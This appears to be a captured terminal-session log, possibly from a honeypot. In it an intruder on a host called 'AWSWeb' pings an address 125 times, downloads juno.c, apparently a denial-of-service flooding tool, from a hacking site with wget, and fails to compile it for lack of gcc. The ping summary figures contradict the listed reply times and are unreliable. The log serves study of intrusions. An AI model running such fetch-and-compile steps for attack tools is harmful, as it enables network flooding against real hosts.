@@ -1,0 +1,160 @@
+[4hAWSWeb:~# yum update
+bash: yum: command not found
+AWSWeb:~# ping 64.40.9.30
+[4lPING 64.40.9.30 (64.40.9.30) 56(84) bytes of data.
+64 bytes from 64.40.9.30 (64.40.9.30): icmp_seq=1 ttl=50 time=48.5 ms
+64 bytes from 64.40.9.30 (64.40.9.30): icmp_seq=2 ttl=50 time=40.2 ms
+64 bytes from 64.40.9.30 (64.40.9.30): icmp_seq=3 ttl=50 time=40.2 ms
+64 bytes from 64.40.9.30 (64.40.9.30): icmp_seq=4 ttl=50 time=45.9 ms
+64 bytes from 64.40.9.30 (64.40.9.30): icmp_seq=5 ttl=50 time=40.3 ms
+64 bytes from 64.40.9.30 (64.40.9.30): icmp_seq=6 ttl=50 time=40.5 ms
+64 bytes from 64.40.9.30 (64.40.9.30): icmp_seq=7 ttl=50 time=49.8 ms
+64 bytes from 64.40.9.30 (64.40.9.30): icmp_seq=8 ttl=50 time=49.3 ms
+64 bytes from 64.40.9.30 (64.40.9.30): icmp_seq=9 ttl=50 time=47.7 ms
+64 bytes from 64.40.9.30 (64.40.9.30): icmp_seq=10 ttl=50 time=48.7 ms
+64 bytes from 64.40.9.30 (64.40.9.30): icmp_seq=11 ttl=50 time=40.3 ms
+64 bytes from 64.40.9.30 (64.40.9.30): icmp_seq=12 ttl=50 time=43.9 ms
+64 bytes from 64.40.9.30 (64.40.9.30): icmp_seq=13 ttl=50 time=48.7 ms
+64 bytes from 64.40.9.30 (64.40.9.30): icmp_seq=14 ttl=50 time=42.0 ms
+64 bytes from 64.40.9.30 (64.40.9.30): icmp_seq=15 ttl=50 time=45.6 ms
+64 bytes from 64.40.9.30 (64.40.9.30): icmp_seq=16 ttl=50 time=40.3 ms
+64 bytes from 64.40.9.30 (64.40.9.30): icmp_seq=17 ttl=50 time=42.8 ms
+64 bytes from 64.40.9.30 (64.40.9.30): icmp_seq=18 ttl=50 time=49.9 ms
+64 bytes from 64.40.9.30 (64.40.9.30): icmp_seq=19 ttl=50 time=45.3 ms
+64 bytes from 64.40.9.30 (64.40.9.30): icmp_seq=20 ttl=50 time=47.8 ms
+64 bytes from 64.40.9.30 (64.40.9.30): icmp_seq=21 ttl=50 time=48.3 ms
+64 bytes from 64.40.9.30 (64.40.9.30): icmp_seq=22 ttl=50 time=41.2 ms
+64 bytes from 64.40.9.30 (64.40.9.30): icmp_seq=23 ttl=50 time=49.8 ms
+64 bytes from 64.40.9.30 (64.40.9.30): icmp_seq=24 ttl=50 time=46.3 ms
+64 bytes from 64.40.9.30 (64.40.9.30): icmp_seq=25 ttl=50 time=42.9 ms
+64 bytes from 64.40.9.30 (64.40.9.30): icmp_seq=26 ttl=50 time=48.0 ms
+64 bytes from 64.40.9.30 (64.40.9.30): icmp_seq=27 ttl=50 time=46.3 ms
+64 bytes from 64.40.9.30 (64.40.9.30): icmp_seq=28 ttl=50 time=42.1 ms
+64 bytes from 64.40.9.30 (64.40.9.30): icmp_seq=29 ttl=50 time=41.1 ms
+64 bytes from 64.40.9.30 (64.40.9.30): icmp_seq=30 ttl=50 time=42.2 ms
+64 bytes from 64.40.9.30 (64.40.9.30): icmp_seq=31 ttl=50 time=40.1 ms
+64 bytes from 64.40.9.30 (64.40.9.30): icmp_seq=32 ttl=50 time=42.9 ms
+64 bytes from 64.40.9.30 (64.40.9.30): icmp_seq=33 ttl=50 time=47.9 ms
+64 bytes from 64.40.9.30 (64.40.9.30): icmp_seq=34 ttl=50 time=43.1 ms
+64 bytes from 64.40.9.30 (64.40.9.30): icmp_seq=35 ttl=50 time=48.3 ms
+64 bytes from 64.40.9.30 (64.40.9.30): icmp_seq=36 ttl=50 time=50.0 ms
+64 bytes from 64.40.9.30 (64.40.9.30): icmp_seq=37 ttl=50 time=45.6 ms
+64 bytes from 64.40.9.30 (64.40.9.30): icmp_seq=38 ttl=50 time=47.8 ms
+64 bytes from 64.40.9.30 (64.40.9.30): icmp_seq=39 ttl=50 time=43.8 ms
+64 bytes from 64.40.9.30 (64.40.9.30): icmp_seq=40 ttl=50 time=47.4 ms
+64 bytes from 64.40.9.30 (64.40.9.30): icmp_seq=41 ttl=50 time=40.7 ms
+64 bytes from 64.40.9.30 (64.40.9.30): icmp_seq=42 ttl=50 time=48.4 ms
+64 bytes from 64.40.9.30 (64.40.9.30): icmp_seq=43 ttl=50 time=49.1 ms
+64 bytes from 64.40.9.30 (64.40.9.30): icmp_seq=44 ttl=50 time=47.6 ms
+64 bytes from 64.40.9.30 (64.40.9.30): icmp_seq=45 ttl=50 time=40.0 ms
+64 bytes from 64.40.9.30 (64.40.9.30): icmp_seq=46 ttl=50 time=41.6 ms
+64 bytes from 64.40.9.30 (64.40.9.30): icmp_seq=47 ttl=50 time=45.1 ms
+64 bytes from 64.40.9.30 (64.40.9.30): icmp_seq=48 ttl=50 time=48.7 ms
+64 bytes from 64.40.9.30 (64.40.9.30): icmp_seq=49 ttl=50 time=47.6 ms
+64 bytes from 64.40.9.30 (64.40.9.30): icmp_seq=50 ttl=50 time=48.9 ms
+64 bytes from 64.40.9.30 (64.40.9.30): icmp_seq=51 ttl=50 time=46.0 ms
+64 bytes from 64.40.9.30 (64.40.9.30): icmp_seq=52 ttl=50 time=47.7 ms
+64 bytes from 64.40.9.30 (64.40.9.30): icmp_seq=53 ttl=50 time=45.0 ms
+64 bytes from 64.40.9.30 (64.40.9.30): icmp_seq=54 ttl=50 time=42.7 ms
+64 bytes from 64.40.9.30 (64.40.9.30): icmp_seq=55 ttl=50 time=45.8 ms
+64 bytes from 64.40.9.30 (64.40.9.30): icmp_seq=56 ttl=50 time=48.2 ms
+64 bytes from 64.40.9.30 (64.40.9.30): icmp_seq=57 ttl=50 time=44.0 ms
+64 bytes from 64.40.9.30 (64.40.9.30): icmp_seq=58 ttl=50 time=49.4 ms
+64 bytes from 64.40.9.30 (64.40.9.30): icmp_seq=59 ttl=50 time=44.3 ms
+64 bytes from 64.40.9.30 (64.40.9.30): icmp_seq=60 ttl=50 time=42.5 ms
+64 bytes from 64.40.9.30 (64.40.9.30): icmp_seq=61 ttl=50 time=47.0 ms
+64 bytes from 64.40.9.30 (64.40.9.30): icmp_seq=62 ttl=50 time=44.5 ms
+64 bytes from 64.40.9.30 (64.40.9.30): icmp_seq=63 ttl=50 time=44.9 ms
+64 bytes from 64.40.9.30 (64.40.9.30): icmp_seq=64 ttl=50 time=42.0 ms
+64 bytes from 64.40.9.30 (64.40.9.30): icmp_seq=65 ttl=50 time=46.1 ms
+64 bytes from 64.40.9.30 (64.40.9.30): icmp_seq=66 ttl=50 time=43.2 ms
+64 bytes from 64.40.9.30 (64.40.9.30): icmp_seq=67 ttl=50 time=49.7 ms
+64 bytes from 64.40.9.30 (64.40.9.30): icmp_seq=68 ttl=50 time=48.2 ms
+64 bytes from 64.40.9.30 (64.40.9.30): icmp_seq=69 ttl=50 time=45.1 ms
+64 bytes from 64.40.9.30 (64.40.9.30): icmp_seq=70 ttl=50 time=47.3 ms
+64 bytes from 64.40.9.30 (64.40.9.30): icmp_seq=71 ttl=50 time=43.0 ms
+64 bytes from 64.40.9.30 (64.40.9.30): icmp_seq=72 ttl=50 time=45.6 ms
+64 bytes from 64.40.9.30 (64.40.9.30): icmp_seq=73 ttl=50 time=49.2 ms
+64 bytes from 64.40.9.30 (64.40.9.30): icmp_seq=74 ttl=50 time=44.4 ms
+64 bytes from 64.40.9.30 (64.40.9.30): icmp_seq=75 ttl=50 time=45.9 ms
+64 bytes from 64.40.9.30 (64.40.9.30): icmp_seq=76 ttl=50 time=44.8 ms
+64 bytes from 64.40.9.30 (64.40.9.30): icmp_seq=77 ttl=50 time=44.6 ms
+64 bytes from 64.40.9.30 (64.40.9.30): icmp_seq=78 ttl=50 time=46.4 ms
+64 bytes from 64.40.9.30 (64.40.9.30): icmp_seq=79 ttl=50 time=47.5 ms
+64 bytes from 64.40.9.30 (64.40.9.30): icmp_seq=80 ttl=50 time=48.7 ms
+64 bytes from 64.40.9.30 (64.40.9.30): icmp_seq=81 ttl=50 time=40.6 ms
+64 bytes from 64.40.9.30 (64.40.9.30): icmp_seq=82 ttl=50 time=40.9 ms
+64 bytes from 64.40.9.30 (64.40.9.30): icmp_seq=83 ttl=50 time=40.3 ms
+64 bytes from 64.40.9.30 (64.40.9.30): icmp_seq=84 ttl=50 time=45.7 ms
+64 bytes from 64.40.9.30 (64.40.9.30): icmp_seq=85 ttl=50 time=45.5 ms
+64 bytes from 64.40.9.30 (64.40.9.30): icmp_seq=86 ttl=50 time=40.7 ms
+64 bytes from 64.40.9.30 (64.40.9.30): icmp_seq=87 ttl=50 time=40.7 ms
+64 bytes from 64.40.9.30 (64.40.9.30): icmp_seq=88 ttl=50 time=49.3 ms
+64 bytes from 64.40.9.30 (64.40.9.30): icmp_seq=89 ttl=50 time=45.9 ms
+64 bytes from 64.40.9.30 (64.40.9.30): icmp_seq=90 ttl=50 time=40.4 ms
+64 bytes from 64.40.9.30 (64.40.9.30): icmp_seq=91 ttl=50 time=43.1 ms
+64 bytes from 64.40.9.30 (64.40.9.30): icmp_seq=92 ttl=50 time=40.4 ms
+64 bytes from 64.40.9.30 (64.40.9.30): icmp_seq=93 ttl=50 time=43.2 ms
+64 bytes from 64.40.9.30 (64.40.9.30): icmp_seq=94 ttl=50 time=42.8 ms
+64 bytes from 64.40.9.30 (64.40.9.30): icmp_seq=95 ttl=50 time=44.4 ms
+64 bytes from 64.40.9.30 (64.40.9.30): icmp_seq=96 ttl=50 time=43.5 ms
+64 bytes from 64.40.9.30 (64.40.9.30): icmp_seq=97 ttl=50 time=42.1 ms
+64 bytes from 64.40.9.30 (64.40.9.30): icmp_seq=98 ttl=50 time=44.3 ms
+64 bytes from 64.40.9.30 (64.40.9.30): icmp_seq=99 ttl=50 time=41.8 ms
+64 bytes from 64.40.9.30 (64.40.9.30): icmp_seq=100 ttl=50 time=49.6 ms
+64 bytes from 64.40.9.30 (64.40.9.30): icmp_seq=101 ttl=50 time=47.2 ms
+64 bytes from 64.40.9.30 (64.40.9.30): icmp_seq=102 ttl=50 time=40.9 ms
+64 bytes from 64.40.9.30 (64.40.9.30): icmp_seq=103 ttl=50 time=41.4 ms
+64 bytes from 64.40.9.30 (64.40.9.30): icmp_seq=104 ttl=50 time=40.5 ms
+64 bytes from 64.40.9.30 (64.40.9.30): icmp_seq=105 ttl=50 time=40.8 ms
+64 bytes from 64.40.9.30 (64.40.9.30): icmp_seq=106 ttl=50 time=43.9 ms
+64 bytes from 64.40.9.30 (64.40.9.30): icmp_seq=107 ttl=50 time=41.5 ms
+64 bytes from 64.40.9.30 (64.40.9.30): icmp_seq=108 ttl=50 time=44.1 ms
+64 bytes from 64.40.9.30 (64.40.9.30): icmp_seq=109 ttl=50 time=48.2 ms
+64 bytes from 64.40.9.30 (64.40.9.30): icmp_seq=110 ttl=50 time=42.5 ms
+64 bytes from 64.40.9.30 (64.40.9.30): icmp_seq=111 ttl=50 time=45.1 ms
+64 bytes from 64.40.9.30 (64.40.9.30): icmp_seq=112 ttl=50 time=45.9 ms
+64 bytes from 64.40.9.30 (64.40.9.30): icmp_seq=113 ttl=50 time=48.7 ms
+64 bytes from 64.40.9.30 (64.40.9.30): icmp_seq=114 ttl=50 time=46.9 ms
+64 bytes from 64.40.9.30 (64.40.9.30): icmp_seq=115 ttl=50 time=43.7 ms
+64 bytes from 64.40.9.30 (64.40.9.30): icmp_seq=116 ttl=50 time=40.3 ms
+64 bytes from 64.40.9.30 (64.40.9.30): icmp_seq=117 ttl=50 time=47.3 ms
+64 bytes from 64.40.9.30 (64.40.9.30): icmp_seq=118 ttl=50 time=46.1 ms
+64 bytes from 64.40.9.30 (64.40.9.30): icmp_seq=119 ttl=50 time=46.4 ms
+64 bytes from 64.40.9.30 (64.40.9.30): icmp_seq=120 ttl=50 time=47.7 ms
+64 bytes from 64.40.9.30 (64.40.9.30): icmp_seq=121 ttl=50 time=43.7 ms
+64 bytes from 64.40.9.30 (64.40.9.30): icmp_seq=122 ttl=50 time=46.6 ms
+64 bytes from 64.40.9.30 (64.40.9.30): icmp_seq=123 ttl=50 time=45.1 ms
+64 bytes from 64.40.9.30 (64.40.9.30): icmp_seq=124 ttl=50 time=42.4 ms
+64 bytes from 64.40.9.30 (64.40.9.30): icmp_seq=125 ttl=50 time=47.5 ms
+--- 64.40.9.30 ping statistics ---
+125 packets transmitted, 125 received, 0% packet loss, time 907ms
+rtt min/avg/max/mdev = 48.264/50.352/52.441/2.100 ms
+[4hAWSWeb:~# wget http://packetstorm.wowhacker.com/DoS/juno.c
+[4l--2013-12-07 12:34:19--  http://packetstorm.wowhacker.com/DoS/juno.c
+Connecting to packetstorm.wowhacker.com:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 7774 (7K) [text/x-c]
+Saving to: `juno.c
+
+15% [======>                                ] 1,209        1K/s  eta 4s100%[======================================>] 7,774        1K/s
+
+2013-12-07 12:34:20 (1 KB/s) - `juno.c' saved [7774/7774]
+[4hAWSWeb:~# gcc -O2 juno.c -o juno 
+bash: gcc: command not found
+AWSWeb:~# 
+AWSWeb:~# ls
+[4ljuno.c 
+[4hAWSWeb:~# chmod +x junoc
+[4l[4hAWSWeb:~# ls
+[4ljuno.c 
+[4hAWSWeb:~#  chmod +x juno.c
+[4l[4hAWSWeb:~# ls
+[4ljuno.c 
+[4hAWSWeb:~# gcc -O2 juno.c -o juno
+bash: gcc: command not found
+AWSWeb:~# wget ftp://mirrors.kernel.org/gnu/gcc/gcc-3.4.6/gcc-3.4.6.tar.bz2
+[4lftp://mirrors.kernel.org/gnu/gcc/gcc-3.4.6/gcc-3.4.6.tar.bz2: Unsupported scheme.
+[4hAWSWeb:~# wget ftp://mirrors.kernel.org/gnu/gcc/gcc-3.4.6/gcc-3.4.6.tar.bz2
+[4lftp://mirrors.kernel.org/gnu/gcc/gcc-3.4.6/gcc-3.4.6.tar.bz2: Unsupported scheme.
+[4hAWSWeb:~# 
